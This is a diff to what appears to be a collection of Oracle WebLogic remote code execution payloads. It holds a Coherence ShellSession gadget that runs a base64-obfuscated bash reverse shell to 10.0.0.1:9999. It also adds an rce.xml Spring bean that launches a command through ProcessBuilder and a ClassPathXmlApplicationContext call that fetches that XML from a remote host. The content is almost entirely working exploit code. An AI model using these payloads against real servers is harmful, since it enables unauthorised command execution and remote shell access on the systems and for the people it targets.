@@ -94,9 +94,26 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|
 com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(new%20String%20[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"});')
 ```
 ###
+rce.xml
+```
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+          <list>
+            <value>bash</value>
+            <value>-c</value>
+            <value><![CDATA[touch /tmp/success2]]></value>
+          </list>
+        </constructor-arg>
+    </bean>
+</beans>
+```
 ###
 ```
-com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://10.0.0.1/poc.xml")
+com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://10.0.0.1/rce.xml")
 ```
 ###
 #### Base64 Encoded Payload for Deserialization
